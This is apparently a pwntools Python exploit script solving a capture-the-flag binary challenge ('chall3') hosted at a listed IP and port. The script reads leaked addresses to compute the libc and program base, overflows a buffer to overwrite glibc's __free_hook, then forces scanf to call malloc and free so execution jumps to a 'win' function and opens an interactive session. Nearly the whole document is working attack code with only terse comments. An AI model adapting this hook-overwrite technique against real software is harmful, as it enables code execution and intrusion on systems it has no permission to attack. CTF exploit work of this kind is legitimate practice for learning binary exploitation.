#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./chall3')
libc = ELF('./libc.so.6')

host, port = "3.97.113.25", "9003"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# get libc leak
p.recvuntil('STUFF ', drop=True)
leak1 = int(p.recvuntil(' ',drop=True),16)
print('leak1 = '+hex(leak1))
libc.address = leak1 - libc.symbols['system']
print('libc base = '+hex(libc.address))

leak2 = int(p.recvuntil('!',drop=True),16)
print('leak2 = '+hex(leak2))

progbase = leak2 - 0x11a2
print('progbase = '+hex(progbase))

# we write to _free_hook
payload = 'A'*0x28+p64(libc.symbols['__free_hook'])

p.sendafter('Insecure!!!!\n', payload)

# address of win function, we launch free by sending much data to force scanf to call malloc & free...
p.sendline('0'*5000+str(progbase+0x1185))

p.interactive()

